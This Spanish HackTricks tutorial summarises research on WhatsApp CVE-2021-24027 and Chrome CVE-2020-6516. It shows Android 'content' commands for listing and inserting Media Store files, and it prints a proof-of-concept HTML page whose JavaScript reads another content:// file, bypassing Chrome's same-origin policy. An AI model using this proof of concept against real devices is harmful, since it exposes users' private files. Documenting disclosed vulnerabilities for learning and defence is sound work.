<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Este es un resumen del post [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Listado de Archivos en Media Store
Para listar los archivos gestionados por Media Store, se puede utilizar el siguiente comando:
```bash
$ content query --uri content://media/external/file
```
Para obtener una salida m√°s amigable para el usuario, mostrando solo el identificador y la ruta de cada archivo indexado:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Los proveedores de contenido est√°n aislados en su propio espacio de nombres privado. El acceso a un proveedor requiere el URI espec√≠fico `content://`. La informaci√≥n sobre las rutas para acceder a un proveedor se puede obtener de los manifiestos de aplicaciones o del c√≥digo fuente del framework de Android.

### Acceso de Chrome a los Proveedores de Contenido
Chrome en Android puede acceder a proveedores de contenido a trav√©s del esquema `content://`, lo que le permite acceder a recursos como fotos o documentos exportados por aplicaciones de terceros. Para ilustrar esto, se puede insertar un archivo en el Media Store y luego acceder a √©l a trav√©s de Chrome:

Insertar una entrada personalizada en el Media Store:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Descubre el identificador del archivo reci√©n insertado:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
El archivo luego se puede ver en Chrome utilizando una URL construida con el identificador del archivo.

Por ejemplo, para listar archivos relacionados con una aplicaci√≥n espec√≠fica:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Bypass de la Pol√≠tica de Mismo Origen

El _Same Origin Policy_ (SOP) es un protocolo de seguridad en los navegadores que restringe a las p√°ginas web de interactuar con recursos de diferentes or√≠genes a menos que sea expl√≠citamente permitido por una pol√≠tica de Compartir Recursos de Origen Cruzado (CORS). Esta pol√≠tica tiene como objetivo prevenir filtraciones de informaci√≥n y falsificaci√≥n de solicitudes entre sitios. Chrome considera `content://` como un esquema local, lo que implica reglas de SOP m√°s estrictas, donde cada URL de esquema local se trata como un origen separado.

Sin embargo, CVE-2020-6516 fue una vulnerabilidad en Chrome que permit√≠a eludir las reglas de SOP para recursos cargados a trav√©s de una URL `content://`. En efecto, el c√≥digo JavaScript de una URL `content://` pod√≠a acceder a otros recursos cargados a trav√©s de URLs `content://`, lo que representaba una preocupaci√≥n de seguridad significativa, especialmente en dispositivos Android que ejecutaban versiones anteriores a Android 10, donde el almacenamiento con √°mbito no estaba implementado.

El siguiente ejemplo de concepto demuestra esta vulnerabilidad, donde un documento HTML, despu√©s de ser cargado en **/sdcard** y a√±adido a la Media Store, utiliza `XMLHttpRequest` en su JavaScript para acceder y mostrar el contenido de otro archivo en la Media Store, eludiendo las reglas de SOP.

HTML de Ejemplo de Concepto:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
